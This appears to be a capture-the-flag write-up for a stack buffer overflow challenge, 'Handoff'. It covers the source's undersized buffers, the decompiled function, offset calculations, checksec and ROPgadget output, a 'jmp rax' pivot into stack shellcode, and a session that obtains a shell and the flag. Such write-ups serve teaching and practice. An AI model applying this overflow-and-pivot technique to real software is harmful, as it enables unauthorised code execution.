Handoff

To start off this challenge I looked through the provided code to find any
vulnerabilities. The first vulnerabilities I found were vulnerabilities that gave
me the opportunity to hijack the execution flow by overflowing a buffer. So I
started by looking at all of the buffers in the program and making a note of
them.

## Buffers in vuln

    char feedback[8];
    entry_t entries[10];
    int total_entries = 0;
    int choice = -1;

## Global buffers

    #define MAX_ENTRIES 10
    #define NAME_LEN 32
    #define MSG_LEN 64
    typedef struct entry {
        char name[8];
        char msg[64];
    } entry_t;

Notice that the name len macro is larger than the size of the name buffer in
the entries struct. This gives us the opportunity to overflow it when we get
to this line:

    fgets(entries[total_entries].name, NAME_LEN, stdin);

Later on in the code we find this line:

    fgets(feedback, NAME_LEN, stdin)

This gives us another opportunity to overflow a buffer. Now that I have
finished looking through the provided code I can look at the disassembled vuln
function in ghidra to see where all of the buffers are in memory to determine
how I want to approach this challenge.

## Vuln in ghidra

```
    void vuln(void)

{
  int iVar1;
  int local_2ec;
  char local_2e8 [8];
  char acStack_2e0 [716];
  char local_14 [8];
  int local_c;
  
  local_c = 0;
  local_2ec = -1;
  while( true ) {
    while( true ) {
      while( true ) {
        print_menu();
        iVar1 = __isoc99_scanf(&DAT_00402079,&local_2ec);
        if (iVar1 != 1) {
                    /* WARNING: Subroutine does not return */
          exit(0);
        }
        getchar();
        if (local_2ec != 1) break;
        local_2ec = -1;
        if (local_c < 10) {
          puts("What\'s the new recipient\'s name: ");
          fflush(stdin);
          fgets(local_2e8 + (long)local_c * 0x48,0x20,stdin);
          local_c = local_c + 1;
        }
        else {
          puts("Max recipients reached!");
        }
      }
      if (local_2ec == 2) break;
      if (local_2ec == 3) {
        local_2ec = -1;
        puts(
            "Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: "
            );
        fgets(local_14,0x20,stdin);
        return;
      }
      local_2ec = -1;
      puts("Invalid option");
    }
    local_2ec = -1;
    puts("Which recipient would you like to send a message to?");
    iVar1 = __isoc99_scanf(&DAT_00402079,&local_2ec);
    if (iVar1 != 1) break;
    getchar();
    if (local_2ec < local_c) {
      puts("What message would you like to send them?");
      fgets(acStack_2e0 + (long)local_2ec * 0x48,0x40,stdin);
    }
    else {
      puts("Invalid entry number");
    }
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```

Looking through the function in ghidra and comparing the functions to the provided source code we can determine that local_2ec is choice, local_2e8 is entries, local_2e8 + local_c * 0x48 is entries[total_entries].name, local_14 is feedback, and acStack_2e0 + local_2ec * 0x48 is entries[total_entries].MSG. Cross referencing the names with their location in memory according to ghidra we get the following map. Note that ghidra split the array into two variables because it didn't recognize the struct layout.

## Stack Map

```
Address        | Name
------------------------------
$rbp - 0xc     | feedback
$rbp - 0x2e0   | entries[0].name / entries (base)
$rbp - 0x2d8   | entries[0].msg
$rbp + 0x8     | return address or $rip    
```

Now that we have the addresses of the buffers we can go ahead and calculate the distance of each to the return address since no matter what we decide to do we will need to overwrite it to get to a shell. We also need to determine based on the distance and the amount that we are allowed to overflow each buffer based on what is passed to each fgets function call if each variable can even reach the return address. 

## Distance to return address

```
Distance                                      |     Variables               |   Overflow Size
----------------------------------------------------------------------------------------------
($rbp + 0x8) - ($rbp - 0x2e0) = 0x2e8 or 744  |  Return to entries[0].name  |   32 - 8 = 24
($rbp + 0x8) - ($rbp - 0x2d8) = 0x2e0 or 736  |  Return to entries[0].msg   |        0
($rbp + 0x8) - ($rbp - 0xc) = 0x14 or 20      |  Return to feedback         |   32 - 8 - 1 = 23

```
These are the only two buffers that can be overflowed and only feedback can be overflowed and make it to the return address to overwrite it. So now we know that we can use feedback to overwrite the return address. Before we do that we should take a look at the binary for any weaknesses using checksec.

## Checksec

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   73 Symbols	 No	0		1		./handoff
 
```

From this we can see that there is no stack canary which means we can overflow buffers without having to worry about corrupting the canary value between the stack and the return address. There is no PIE which means addresses have the same offsets from each other instead of being placed completely randomly inside in the binary which means our offset calculations will be useful for our attack. Nx disabled means that we will be able to execute code on the stack. Armed with this information we can flesh out a plan of attack. First we'll have to store some shellcode on the stack so that we can execute it later when we overwrite the return address with the address where we stored the shellcode. We know that feedback is the only buffer that will allow us to overwrite the return address so we can't store the shellcode there. That leaves us with the message buffer and the name buffer. In the message buffer I'll store the shell code. Now that leaves us with the problem of getting back to the address of the buffer where the shell code is stored. By using ROPgadget we can look for tools that might be able to get us to the shellcode.

## ROPgadget

```
    Gadgets information
============================================================
0x000000000040113d : add ah, dh ; nop ; endbr64 ; ret
0x00000000004013ce : add al, bpl ; retf
0x00000000004013cf : add al, ch ; retf
0x000000000040116b : add bh, bh ; loopne 0x4011d5 ; nop ; ret
0x00000000004014bc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401440 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x00000000004011da : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004014be : add byte ptr [rax], al ; endbr64 ; ret
0x000000000040113c : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401442 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x00000000004011db : add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004011d9 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040113b : add byte ptr cs:[rax], al ; hlt ; nop ; endbr64 ; ret
0x000000000040116a : add dil, dil ; loopne 0x4011d5 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x00000000004011dc : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004012f8 : add dword ptr [rbp - 4], 1 ; jmp 0x401249
0x00000000004011d7 : add eax, 0x2e9b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401225 : call qword ptr [rax + 0xff3c35d]
0x000000000040140b : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x00000000004011f3 : cli ; jmp 0x401180
0x0000000000401143 : cli ; ret
0x00000000004014cb : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401408 : cmp eax, 0x90fffffe ; leave ; ret
0x00000000004011f0 : endbr64 ; jmp 0x401180
0x0000000000401140 : endbr64 ; ret
0x000000000040149c : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040113e : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401165 : je 0x401170 ; mov edi, 0x404060 ; jmp rax
0x00000000004011a7 : je 0x4011b0 ; mov edi, 0x404060 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004011f4 : jmp 0x401180
0x00000000004012fc : jmp 0x401249
0x00000000004012a5 : jmp 0x401407
0x00000000004013f1 : jmp 0x40140c
0x000000000040100b : jmp 0x4840103f
0x000000000040116c : jmp rax
0x000000000040140d : leave ; ret
0x000000000040116d : loopne 0x4011d5 ; nop ; ret
0x00000000004013ed : mov byte ptr [rbp - 5], 0 ; jmp 0x40140c
0x00000000004011d6 : mov byte ptr [rip + 0x2e9b], 1 ; pop rbp ; ret
0x000000000040143f : mov eax, 0 ; pop rbp ; ret
0x0000000000401167 : mov edi, 0x404060 ; jmp rax
0x000000000040113f : nop ; endbr64 ; ret
0x000000000040140c : nop ; leave ; ret
0x0000000000401226 : nop ; pop rbp ; ret
0x000000000040116f : nop ; ret
0x00000000004011ec : nop dword ptr [rax] ; endbr64 ; jmp 0x401180
0x00000000004013a0 : or byte ptr [rax - 0x77], cl ; retf 0x40be
0x0000000000401166 : or dword ptr [rdi + 0x404060], edi ; jmp rax
0x00000000004014ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014b0 : pop r14 ; pop r15 ; ret
0x00000000004014b2 : pop r15 ; ret
0x00000000004014ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014af : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004011dd : pop rbp ; ret
0x00000000004014b3 : pop rdi ; ret
0x00000000004014b1 : pop rsi ; pop r15 ; ret
0x00000000004014ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
0x00000000004013d1 : retf
0x00000000004012ea : retf 0x20be
0x00000000004013a3 : retf 0x40be
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x00000000004014cd : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004014cc : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401163 : test eax, eax ; je 0x401170 ; mov edi, 0x404060 ; jmp rax
0x00000000004011a5 : test eax, eax ; je 0x4011b0 ; mov edi, 0x404060 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x00000000004011d8 : wait ; add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret

Unique gadgets found: 81
                                 
```

Within the list provided to us by ROPgadget I noticed that there is a jmp rax gadget that could allow us to jump to rax after fgets is called. Since feedback is passed to RAX when fgets is called this would be perfect for chaining over overflow attack with our shellcode. Once we jump to feedback we would need some code that would allow us to go back to the msg buffer in entries[0]. This is what I came up with.

# Link Code

```
sub sp, 0x2e8; jmp rsp
```

This subtracts from the stack pointer the offset to the message buffer from rbp + 0x10. The return address is at rbp + 0x8, but when it jumps to the address saved in RIP it adds 8 bytes to the stack pointer I calculated the offset like so.

## Offset to MSG buffer

```
    ($rbp + 0x10) - ($rbp - 0x2d8) = 0x2e8
```

With that last calculation we have completed the chain. Now that we have everything read we can run the payload program.

## Payload

```
    [+] Opening connection to chatelaine.cylabacademy.net on port 36214: Done
    [*] Switching to interactive mode
    $ cat flag.txt
    academy{p1v0ted_ftw_55f7a523}[*] Got EOF while reading in interactive
    $ 
    [*] Closed connection to chatelaine.cylabacademy.net port 36214
    [*] Got EOF while sending in interactive
```
As you can see we obtained the flag. 
